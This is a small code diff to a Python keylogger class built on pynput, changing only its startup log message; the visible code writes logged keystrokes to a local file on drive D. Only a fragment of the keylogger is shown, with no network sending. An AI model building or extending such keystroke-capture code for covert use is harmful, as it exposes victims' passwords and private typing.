@@ -3,7 +3,7 @@ import pynput.keyboard
 class SimpleKeylogger:
     def __init__(self):
         self.log = ""
-        self.append_to_log("Hunting has begun...\n")
+        self.append_to_log("Key-Logger Has Started...\n")
 
     def append_to_log(self, key_strike):
         with open("D:/log.txt", "a") as log_file:
